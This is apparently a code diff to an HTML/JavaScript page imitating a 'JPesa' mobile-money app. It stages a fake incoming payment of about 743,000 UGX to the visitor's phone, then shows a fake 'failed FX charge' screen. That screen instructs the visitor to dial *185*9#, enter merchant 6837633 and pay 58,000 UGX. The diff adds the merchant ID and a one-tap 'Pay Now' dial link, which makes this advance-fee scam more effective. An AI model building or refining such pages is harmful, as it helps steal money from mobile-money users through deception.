@@ -91,7 +91,7 @@
         .progress-container { width: 100%; background-color: #ddd; border-radius: 10px; margin: 15px 0; height: 10px; }
         .progress-bar { width: 0%; height: 100%; background-color: var(--success-green); border-radius: 10px; transition: width 0.1s linear; }
 
-        .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; justify-content: center; align-items: center; padding: 20px; }
+        .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1000; justify-content: center; align-items: center; padding: 20px; }
         .modal { background: white; padding: 25px; border-radius: 8px; max-width: 400px; width: 100%; text-align: center; }
 
         .loading-ring { border: 4px solid #f3f3f3; border-top: 4px solid var(--jpesa-blue); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 10px auto; }
@@ -99,10 +99,9 @@
 
         .user-info-header { font-weight: bold; color: var(--dark-text); margin-bottom: 5px; text-transform: uppercase; border-bottom: 1px solid #eee; padding-bottom: 5px; }
         
-        /* New Style for Failed Notification */
-        .failed-box { text-align: left; background: #fff; border-radius: 8px; }
-        .failed-header { color: var(--jpesa-red); font-weight: bold; border-bottom: 2px solid #eee; padding-bottom: 10px; margin-bottom: 15px; text-align: center; }
-        .instruction-box { background: #f9f9f9; padding: 15px; border-radius: 5px; border: 1px dashed #ccc; font-family: monospace; }
+        /* Specific Styles for your new Notification */
+        .failed-header { color: var(--jpesa-red); font-weight: bold; font-size: 1.1rem; border-bottom: 2px solid #eee; padding-bottom: 10px; margin-bottom: 15px; }
+        .instruction-box { background: #f9f9f9; padding: 12px; border: 1px dashed #ccc; border-radius: 6px; text-align: left; font-family: 'Courier New', Courier, monospace; font-size: 0.9rem; margin: 10px 0; }
     </style>
 </head>
 <body>
@@ -232,7 +231,7 @@
 
         if(state.step === 3) {
             document.getElementById('notifText').innerHTML = `<b>PAID!</b> Foreign exchange charge 58,000UGX.`;
-            // Actions handled by handleAction now
+            document.querySelectorAll('.btn-action').forEach(b => b.onclick = null);
         }
 
         if(state.step === 4) {
@@ -262,45 +261,41 @@
         }, 6000);
     }
 
-    // NEW LOGIC FOR WITHDRAWAL / RECEIVE
     function handleAction() {
         const ov = document.getElementById('overlay');
         ov.style.display = 'flex';
         
-        // Step 1: Loading notification
+        // Custom Initiation Screen
         document.getElementById('modalContent').innerHTML = `
             <div class="loading-ring"></div>
-            <h3 style="color:var(--jpesa-blue)">Processing Request</h3>
-            <p>Initiating 200$ ~ 743,000UGX to SIM card<br>
+            <h3 style="color: var(--jpesa-blue);">Processing</h3>
+            <p>initiating 200$~ 743,000UGX to SIM card<br>
             <b>${state.phone}</b> (${state.name})</p>
             <p style="font-size:0.8rem; color:#666;">Please wait 10 seconds...</p>
         `;
 
         setTimeout(() => {
-            // Step 2: Failed FX Charge Notification
+            // Failed Notification Screen
             document.getElementById('modalContent').innerHTML = `
-                <div class="failed-box">
-                    <div class="failed-header">FAILED PAY FX CHARGE 58,000UGX</div>
-                    <p style="text-align:center; font-weight:bold;">
-                        Sim Card Verified <span class="blink-green">🇺🇬</span><br>
-                        ${state.phone} - ${state.name}
-                    </p>
-                    <hr>
-                    <p><b>How to pay fx charge Via Merchant:</b></p>
-                    <div class="instruction-box">
-                        Dail: *185*9#<br>
-                        Enter Amount: 58000<br>
-                        Enter Reference: selar Merchant
-                    </div>
-                    <p style="font-size:0.9rem; margin-top:10px;">Confirm to complete the transaction via Merchant ID</p>
-                    <button class="btn-action" onclick="closeOverlay()">Okay i have understood</button>
+                <div class="failed-header">FAILED PAY FX CHARGE 58,000UGX</div>
+                <p>Sim Card Verified <span class="blink-green">🇺🇬</span><br>
+                <b>${state.phone}</b> - ${state.name}</p>
+                
+                <div class="instruction-box">
+                    <b>How to pay fx charge Via Merchant:</b><br>
+                    Dial: *185*9#<br>
+                    Enter Merchant: 6837633<br>
+                    Enter Amount: 58000<br>
+                    Enter Reference: selar Merchant<br>
+                    <small>Confirm to complete the invoice transaction</small>
+                </div>
+
+                <div style="display:flex; gap:10px; margin-top:20px;">
+                    <button class="btn-action" style="flex:1; margin:0;" onclick="window.location.href='tel:*185*9%23'">Pay Now</button>
+                    <button class="btn-action" style="flex:1; margin:0; background:#444;" onclick="document.getElementById('overlay').style.display='none'">Pay Later</button>
                 </div>
             `;
         }, 10000);
-    }
-
-    function closeOverlay() {
-        document.getElementById('overlay').style.display = 'none';
     }
 
     function startEpayLong() {
